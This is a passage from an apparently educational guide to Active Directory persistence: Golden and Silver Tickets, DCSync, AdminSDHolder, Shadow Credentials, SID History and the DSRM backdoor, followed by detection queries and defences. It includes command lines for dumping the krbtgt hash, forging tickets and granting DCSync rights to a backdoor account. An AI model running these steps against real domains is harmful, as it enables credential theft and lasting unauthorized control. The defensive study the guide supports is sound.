  │                   │                     │
  │ ──AP-REQ────────────────────────────── >│
  │   (presents TGS)                        │
  │ <──AP-REP─────────────────────────────  │
  │   (authenticated!)                      │
```

---

## 3. Golden Ticket

The Golden Ticket attack forges a TGT that the KDC accepts as valid because it's correctly signed with the krbtgt secret. This grants the bearer access to any service in the domain.

**Step-by-step process:**
1. Obtain krbtgt NTLM hash via DCSync
2. Obtain domain SID
3. Forge the Golden Ticket with `ticketer.py` or Mimikatz
4. Use `KRB5CCNAME` to authenticate with the forged ticket

**Key insight:** Since the ticket is valid even for non-existent usernames, this bypass works even after the compromised account is disabled. The only defense is resetting the krbtgt password twice (invalidates all outstanding tickets).

---

## 4. Silver Ticket

Unlike the Golden Ticket, the Silver Ticket targets a specific service and is signed with the service account's hash rather than krbtgt. The advantage is that no KDC communication occurs during authentication — the service validates the ticket directly. This makes Silver Tickets significantly harder to detect.

### Common Silver Ticket Service Targets

| SPN | Accessible Service |
|-----|-------------------|
| `cifs/server` | SMB file shares, ADMIN$, C$ |
| `host/server` | WMI, Task Scheduler, Service Manager |
| `http/server` | IIS web services |
| `mssql/server` | SQL Server |
| `wsman/server` | WinRM (PowerShell remoting) |
| `rpcss/server` | DCOM/RPC |
| `ldap/dc` | LDAP queries (targeting DC) |

---

## 5. ACL-based Persistence

### 5.1 Granting DCSync Rights

Adding `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights to a non-DC account allows that account to perform DCSync at any time. This is a stealthy persistence mechanism since the account appears normal.

### 5.2 AdminSDHolder Abuse — Step by Step

AdminSDHolder is a special container at `CN=AdminSDHolder,CN=System,DC=domain,DC=local` that serves as an ACL template for protected group members.

```
[AdminSDHolder abuse flow]

Step 1: Attacker adds their account with GenericAll to AdminSDHolder
          ↓
Step 2: SDProp runs (wait up to 60 minutes, or force it)
          ↓
Step 3: ACL propagates to ALL protected group members
        (Domain Admins, Enterprise Admins, Schema Admins, etc.)
          ↓
Step 4: Attacker can now change the password of ANY Domain Admin
          ↓
Step 5: Even if the security team resets DA passwords,
        the next SDProp run restores attacker's permissions! (auto-persistence)
```

### 5.3 Shadow Credentials — Detailed Explanation

Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute to add an X.509 certificate credential to a target account.

```
[How Shadow Credentials work]

Normal certificate authentication:
  1. User has a smartcard/certificate
  2. DC has the public key registered in msDS-KeyCredentialLink
  3. User authenticates with certificate's private key
  4. DC validates with the registered public key

Shadow Credentials attack:
  1. Attacker generates a new certificate (public/private key pair)
  2. Attacker writes their PUBLIC KEY to target's msDS-KeyCredentialLink
  3. Attacker authenticates using THEIR private key → DC validates with attacker's public key
  4. Attacker authenticates as the target WITHOUT knowing the password!

Detection: Event 5136 (Directory Service object modification)
Prerequisite: GenericWrite or WriteProperty(msDS-KeyCredentialLink) on the target
```

### 5.4 SID History Injection

SID History was designed for domain migrations — preserving a user's old SID so they can still access resources from the old domain. Attackers can inject arbitrary SIDs (like Enterprise Admins) to grant themselves elevated privileges while appearing to be a normal user.

---

## 6. DSRM Backdoor

Every Domain Controller has a local administrator account (DSRM account) used for offline directory recovery. By setting a known DSRM password and enabling network logon via registry key (`DsrmAdminLogonBehavior = 2`), an attacker gains persistent local admin access to all DCs even after domain credential resets.

---

## 7. Python Impacket Examples (Per Technique)

The `ad_persistence_tools.py` script provides a unified CLI for common persistence techniques using Impacket:

**`dcsync`** — dumps krbtgt hash via DCSync, parses and displays NTLM hash

**`golden`** — creates a Golden Ticket `.ccache` file, prints usage instructions

**`silver`** — creates a Silver Ticket for a specific SPN, prints service-specific usage

**`grant-dcsync`** — generates a PowerShell script to grant DCSync rights to a target account

**Usage:**
```bash
# Dump krbtgt hash
python3 ad_persistence_tools.py dcsync 10.10.10.100 corp.local -u admin -p Pass123

# Create Golden Ticket
python3 ad_persistence_tools.py golden corp.local \
  --hash KRBTGT_NTLM_HASH --sid S-1-5-21-XXXX-XXXX-XXXX --user administrator

# Create Silver Ticket for SMB
python3 ad_persistence_tools.py silver corp.local \
  --hash SVC_NTLM_HASH --sid S-1-5-21-XXXX --spn cifs/fileserver.corp.local

# Grant DCSync rights
python3 ad_persistence_tools.py grant-dcsync 10.10.10.100 corp.local \
  -u admin -p Pass123 --target backdoor_user
```

---

## 8. AD Persistence Detection CLI

The `ADPersistenceDetector` class performs three LDAP-based checks:

**`check_admin_account_creation(days=30)`** — finds accounts created within the last N days that are members of protected groups (Domain Admins, Enterprise Admins, etc.)

**`check_pwdneverexpires()`** — identifies user accounts with `DONT_EXPIRE_PASSWORD` flag set, especially those in privileged groups (potential backdoor accounts)

**`check_shadow_credentials()`** — finds any account with a non-empty `msDS-KeyCredentialLink` attribute, which indicates Shadow Credentials have been set

**Usage:**
```bash
python3 ad_persistence_detector.py 10.10.10.100 corp.local \
    -u auditor -p AuditPass123 -o persistence_findings.json
```

---

## 9. Detection Queries and Defense

### 9.1 Splunk/KQL Detection Queries

```splunk
# Splunk — DCSync detection
index=winsecurity EventCode=4662
| eval prop_guid=mvindex(Properties,0)
| where prop_guid IN (
    "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
    "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"
  )
| where NOT (SubjectUserName LIKE "%$%")
| stats count by SubjectUserName, IpAddress, _time
```

```kql
// KQL (Microsoft Sentinel) — Shadow Credentials detection
SecurityEvent
| where EventID == 5136
| where ObjectClass == "user"
| where AttributeLDAPDisplayName == "msDS-KeyCredentialLink"
| where OperationType == "%%14674"  // value added
| project TimeGenerated, SubjectUserName, ObjectName, AttributeValue

// KQL — Golden Ticket detection (RC4 encryption or non-existent user TGS)
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"  // RC4-HMAC (weak encryption)
| where ServiceName !endswith "$"
| summarize count() by AccountName, ClientAddress, ServiceName, bin(TimeGenerated, 1h)
| where count_ > 10
```

### 9.2 Persistence Defense Summary

| Persistence Technique | Detection Event | Defense |
|-----------------------|----------------|---------|
| Golden Ticket | Event 4769 — RC4 encrypted TGS / non-existent user | Reset krbtgt password twice + enforce AES |
| Silver Ticket | Event 4627 — anomalous service access | Enable PAC validation |
| DCSync | Event 4662 — DS-Replication events | SIEM rule / canary accounts |
| Shadow Credentials | Event 5136 — directory service modification | Monitor msDS-KeyCredentialLink changes |
| AdminSDHolder | Event 5136 — AdminSDHolder modification | Monitor SDProp logs |
| New admin account | Events 4728, 4732 — group member addition | Alert on protected group changes |
| DSRM activation | Registry change | Force DsrmAdminLogonBehavior=0 |
| SID History injection | Events 4765, 4766 — SID History addition | Enable SID filtering |
